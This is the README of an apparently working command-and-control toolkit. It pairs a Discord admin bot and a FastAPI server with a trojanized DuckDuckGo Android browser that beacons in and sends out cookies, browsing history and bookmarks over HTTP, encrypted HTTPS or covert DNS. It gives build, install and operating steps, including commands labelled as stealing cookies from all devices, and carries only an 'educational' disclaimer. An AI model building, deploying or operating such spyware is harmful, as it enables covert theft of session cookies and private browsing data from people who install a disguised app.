# 🏠 My Little APT

A monorepo for an educational Command and Control (C2) project. The system is composed of a **Discord bot** (admin panel), a **server** (C2 backend), and a **trojanized DuckDuckGo Android browser** (client beacon) — all managed in a single repository.

> ⚠️ **Disclaimer:** This project was created **strictly for educational purposes**. It is intended to help understand cybersecurity concepts such as C2 architectures, network protocols, and defensive strategies. **Do not use this for any malicious or unauthorized activity.**

---

## Architecture

```
my-little-apt/
├── discord-bot/   → Discord-based admin panel (Python)
├── server/        → C2 backend server (FastAPI)
└── trojan-ddg/    → Trojanized DuckDuckGo Android browser (Kotlin)
```

### Communication Channels

The system separates two distinct channels — a design pattern used by real APTs:

| Channel | Transport | Purpose |
|---|---|---|
| **Command channel** | Always HTTP | Check-in, task polling (`/beacon/check-in`, `/beacon/tasks`) |
| **Exfiltration channel** | Configurable | Result submission — protocol set by `/set-communication-protocol` |

The `communication_protocol` setting controls **only the exfiltration channel**. The command channel is always plain HTTP. This keeps the beacon reliable while allowing covert data exfiltration.

#### Exfiltration Protocols

| Protocol | Mechanism | Key location |
|---|---|---|
| `http` | Plain JSON POST to `/beacon/result` | — |
| `https` | AES-256-CBC encrypted payload, base64-encoded, POST to `/beacon/result` | `server/config.py → AES_SECRET_KEY` / `C2NetworkModule.kt → AES_KEY` |
| `dns` | base64 payload split into 40-char chunks sent as DNS A-queries directly to the C2 server UDP port | `server/config.py → DNS_LISTENER_PORT` / `C2NetworkModule.kt → C2_DNS_PORT` |

> **DNS note:** The Android client sends UDP packets directly to `C2_SERVER_IP:C2_DNS_PORT`, bypassing the system resolver. The server runs a `dnslib`-based listener on that port. Port 5300 (default) requires no root; port 53 requires `sudo` or `setcap cap_net_bind_service`.

### End-to-End Flow

```
┌─────────────┐      HTTP       ┌─────────────┐      HTTP       ┌─────────────────┐
│ Discord Bot │ ──────────────▶ │ FastAPI      │ ◀────────────── │ DDG Browser     │
│ (admin)     │   /admin/*      │ Server       │   /beacon/*     │ (BeaconWorker)  │
│             │ ◀────────────── │ :8000        │ ──────────────▶ │                 │
└─────────────┘                 └─────────────┘                  └─────────────────┘
                                     │
                              Per-device task queue
                         (queue on /admin, dequeue on /beacon)
```

1. **Admin queues a task** via Discord (`/queue-task device=POCO_F5 type=request-cookies`)
2. **Server stores** the task in a per-device queue
3. **Beacon polls** at a configurable interval (15–120 seconds) via `/beacon/tasks/{device_name}`
4. **Server dequeues** and returns the task (fire-once)
5. **Client executes** the command (e.g., reads cookies from WebView) and sends the result back via `/beacon/result`
6. **Beacon reads** the `beacon_interval` from the server response and dynamically schedules its next check-in

---

## 🚀 Quick Start — Running Locally

### Prerequisites

- **Python 3.12+** (for server and bot)
- **Android Studio** with JDK 21 bundled (for the Android client)
- A **Discord bot token** from the [Discord Developer Portal](https://discord.com/developers/applications)
- An **Android device** or emulator on the same LAN as the server

### Step 1: Start the C2 Server

```bash
cd server

# Install dependencies
pip install -r requirements.txt

# Copy config and adjust if needed
cp config-example.py config.py
# Default: host=0.0.0.0, port=8000

# Run the server
python server.py
# Server will be available at http://<YOUR_LAN_IP>:8000
# API docs at http://<YOUR_LAN_IP>:8000/docs
```

> **Important:** The server binds to `0.0.0.0:8000` by default, which means it accepts connections from any device on your network. Find your LAN IP with `hostname -I` or `ip addr`.

### Step 2: Start the Discord Bot

```bash
cd discord-bot

# Install dependencies
pip install -r requirements.txt

# Copy config and fill in your credentials
cp config-example.py config.py
# Edit config.py:
#   DISCORD_BOT_TOKEN = "your_actual_token"
#   ADMIN_DISCORD_ID = your_numeric_discord_id
#   C2_SERVER_URL = "http://localhost:8000"  (or your LAN IP)

# Run the bot
python bot.py
```

### Step 3: Configure the Android Client

Before building the APK, update the C2 server URL in the client to point to your server:

```
File: trojan-ddg/trojan/trojan-impl/src/main/java/com/duckduckgo/trojan/impl/di/C2NetworkModule.kt
Line 44: .baseUrl("http://<YOUR_LAN_IP>:8000/")
```

> Replace `<YOUR_LAN_IP>` with the IP of the machine running the server (e.g., `192.168.0.204`). The Android device and the server **must be on the same network**.

Then build and install the APK:

```bash
cd trojan-ddg

# Build debug APK
JAVA_HOME=/path/to/android-studio/jbr ./gradlew assembleDebug

# Install on connected device
adb install app/build/outputs/apk/debug/app-debug.apk
```

### Step 4: Operate via Discord

Once all three components are running:

```
/queue-task device=POCO_F5 type=request-cookies     → steal browser cookies
/queue-task device=POCO_F5 type=request-history      → steal browsing history
/queue-task device=POCO_F5 type=request-bookmarks    → steal bookmarks
/queue-task device=* type=request-cookies             → target ALL devices
/pending-tasks                                        → check queued tasks
/show-devices                                         → list connected devices
```

> **Note:** Using `device=*` enqueues the task only for devices **already registered** at the moment the command is issued. Any device that checks in after the command is sent will **not** receive that task. Run `/show-devices` first to confirm which devices are online before broadcasting a task.

---

## 🤖 Discord Bot

The Discord bot serves as the **admin panel** for the C2 server. It accepts commands exclusively from an authorized administrator.

### Available Commands

| Command | Arguments | Description |
|---|---|---|
| `/show-devices` | — | Lists all managed devices with their status |
| `/set-beacon-interval` | `15` \| `30` \| `60` \| `120` (autocomplete) | Sets the beacon interval (seconds) |
| `/request-cookies` | — | Shows cached cookies **and** auto-queues a fresh exfiltration for all devices |
| `/request-history` | `device` (optional, default `*`) | Queues a history exfiltration task |
| `/request-bookmarks` | `device` (optional, default `*`) | Queues a bookmarks exfiltration task |
| `/set-communication-protocol` | `http` \| `https` \| `dns` (autocomplete) | Sets the exfiltration channel protocol |
| `/queue-task` | `device`, `task_type`, `parameters` (autocomplete) | Queue a task for a device (or `*` for all) |
| `/pending-tasks` | — | Show pending task counts per device |
| `/show-results` | — | Show the latest exfiltrated data per task type per device |

> Commands use Discord's native slash command system — type `/` in the chat to see all available commands with autocomplete.

---

## 🖥️ Server API

The FastAPI server exposes two groups of endpoints:

### Admin Endpoints (Bot → Server)

| Method | Endpoint | Description |
|---|---|---|
| `GET` | `/admin/devices` | List all registered devices |
| `GET` | `/admin/cookies` | Get cookies from all devices |
| `GET` | `/admin/results` | Get latest exfiltrated result per task type per device |
| `POST` | `/admin/beacon-interval` | Set beacon interval |
| `POST` | `/admin/communication-protocol` | Set exfiltration protocol (`http`/`https`/`dns`) |
| `POST` | `/admin/queue-task` | Queue a task for a device |
| `GET` | `/admin/pending-tasks` | View pending task queue summary |

### Beacon Endpoints (Client → Server)

| Method | Endpoint | Description |
|---|---|---|
| `POST` | `/beacon/check-in` | Device registers/updates its presence |
| `GET` | `/beacon/tasks/{device_name}` | Device polls for queued tasks (dequeues) |
| `POST` | `/beacon/result` | Device submits task execution result |
| `GET` | `/beacon/config` | Get current server configuration |
| `GET` | `/health` | Health check |

> Full interactive API docs available at `http://<server>:8000/docs` (Swagger UI).

---

## 📱 Trojan Client (trojan-ddg)

The client is a modified DuckDuckGo Android browser with an embedded C2 beacon module. It follows DDG's native `API/impl` module pattern so it integrates seamlessly into the app.

### Module Structure

```
trojan-ddg/trojan/
├── trojan-api/          → Interface contract (BeaconService, PendingCommand)
└── trojan-impl/         → Implementation
    ├── C2ApiService.kt      → Retrofit interface aligned with server endpoints
    ├── C2NetworkModule.kt   → @Named("c2") OkHttp/Retrofit (isolated from DDG)
    ├── RealBeaconService.kt → Check-in + task polling logic
    ├── CommandHandler.kt    → Dispatches: request-cookies/history/bookmarks
    └── BeaconWorker.kt      → Self-rescheduling OneTimeWorkRequest (dynamic interval)
```

### Supported Commands

| Task Type | Parameters | Data Source | What it exfiltrates |
|---|---|---|---|
| `request-cookies` | `{"domains": "google.com,github.com"}` | `CookieManagerProvider` → WebView `CookieManager` | Browser cookies for specified (or default) domains |
| `request-history` | — | `NavigationHistory` | Browsing URLs, titles, visit counts |
| `request-bookmarks` | — | `SavedSitesRepository` | All bookmarks and favorites |

### How the Beacon Works

1. `BeaconInitializer` schedules a `OneTimeWorkRequest` with a 15-second initial delay when the app starts
2. `BeaconWorker` fires and calls `POST /beacon/check-in` to register the device
3. Then `GET /beacon/tasks/{device_name}` to poll for commands
4. For each command, `CommandHandler.execute()` gathers the data
5. Results are sent back via `POST /beacon/result`
6. The worker reads `beacon_interval` from the server response and schedules the **next** `OneTimeWorkRequest` with that interval (self-rescheduling chain)

> **Dynamic intervals:** The admin can change the beacon interval at any time via `/set-beacon-interval`. The client picks up the new value on its next check-in. Valid values: `15`, `30`, `60`, `120` seconds.

---

## 🧪 Running Tests

### Server Tests (78 tests)

```bash
cd server
pip install -r requirements.txt -r requirements-dev.txt
python -m pytest tests/ -v
```

### Discord Bot Tests (121 tests)

```bash
cd discord-bot
pip install -r requirements.txt -r requirements-dev.txt
python -m pytest tests/ -v
```

### Android Client Tests (36 tests)

```bash
cd trojan-ddg
JAVA_HOME=/path/to/android-studio/jbr ./gradlew :trojan-impl:testDebugUnitTest
```

> **Note:** If you don't have a system-wide Java, use Android Studio's bundled JDK:
> ```bash
> JAVA_HOME=~/.local/share/JetBrains/Toolbox/apps/android-studio/jbr
> ```

---

## CI/CD

All GitHub Actions workflows live in `.github/workflows/`. Each component has its own pipeline, scoped by `paths` filters.

| Pipeline | File | Trigger | Tests |
|---|---|---|---|
| **discord-bot** | `discord-bot-ci.yml` | `discord-bot/**` changes | lint, mypy, bandit, pytest, pip-audit |
| **server** | `server-ci.yml` | `server/**` changes | lint, mypy, bandit, pytest, pip-audit |
| **trojan** | `trojan-ci.yml` | `trojan-ddg/trojan/**` changes | `:trojan-impl:testDebugUnitTest` |

---

## Project Structure

| File / Directory | Purpose |
|---|---|
| `discord-bot/bot.py` | Bot entry point, slash commands, access control, HTTP bridge |
| `discord-bot/config-example.py` | Configuration template (copy to `config.py`) |
| `discord-bot/devices.py` | `DeviceManager` class — standalone/fallback logic |
| `discord-bot/tests/` | Test suite |
| `server/server.py` | FastAPI server with admin and beacon endpoints |
| `server/command_handler.py` | Server-side state management + per-device task queue |
| `server/models.py` | Pydantic data models |
| `server/tests/` | Test suite (67 tests) |
| `trojan-ddg/trojan/` | C2 beacon module (trojan-api + trojan-impl) |
| `.github/workflows/` | CI/CD pipeline definitions |

---

## Security

- `config.py` files are **excluded from version control** via `.gitignore` — they contain real credentials.
- Use `config-example.py` as a template and create your own `config.py` locally.
- The C2 server URL in the Android client is **hardcoded** in `C2NetworkModule.kt` — change it before building.
- The server binds to `0.0.0.0` — do **NOT** expose it to the public internet.

---

## License

This project is for **educational purposes only**.
